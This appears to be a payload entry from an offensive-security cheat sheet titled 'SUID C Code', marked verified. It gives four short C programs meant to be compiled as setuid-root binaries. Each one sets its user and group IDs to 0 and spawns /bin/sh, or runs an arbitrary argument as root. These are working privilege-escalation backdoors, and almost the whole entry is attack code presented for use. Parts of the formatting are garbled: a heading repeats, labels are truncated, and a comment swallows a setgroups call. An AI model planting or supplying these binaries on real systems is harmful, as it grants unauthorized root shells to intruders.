---
id: cfbc7112-42cf-4a8a-b199-9c815879c1c3
name: SUID C Code
type: payload
verified: true
created_at: '2019-09-17T20:08:40.346487+00:00'
updated_at: '2023-05-30T20:04:29.116420+00:00'
---

# SUID C Code

**Status**: ✓ Verified

 Compile this C Code as a SUID binary How to Compile C Code 

## Description

## Description

Compile this C Code as a SUID binary

## How to Compile C Code

**Command**: [[gcc Compile C Code Binary]]

> SetUID execvp shell C Code

**Code** ([[#include <stdio.h>
#include <stdlib.h>
#include <u]]):

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0); execvp("/bin/sh", NULL); return 0;
}

```

> SetUID execl shell One-Liner C Code

**Code** ([[int main(void) {setgid(0); setuid(0);execl("/bin/s]]):

```c
int main(void) {setgid(0); setuid(0);execl("/bin/sh","sh",0);return 0;}
```

> SetUID execvp "RUN AS" C Code

**Code** ([[#include <stdio.h>
#include <unistd.h>

int main(i]]):

```c
#include <stdio.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    if (argc > 1) printf("%s", execvp(argv[1], &argv[1]));
    return 0;
}

```

> SetUID specify Group C Code

**Code** ([[#include <unistd.h>
#include <sys/types.h>
#includ]]):

```c
#include <unistd.h>
#include <sys/types.h>
#include <grp.h>
#include <stdio.h>

int main (int argc, char** argv) {
    gid_t newGrp = 0;
    if (setuid(0) != 0) {
        perror("Setuid failed, no suid-bit set?"); return 1;
    }

    setgid(0);
    seteuid(0);
    setegid(0);

    // Replace the user's group with that of root setgroups(1, &newGrp);
    execvp("/bin/sh", argv);
    return 0;
}
```
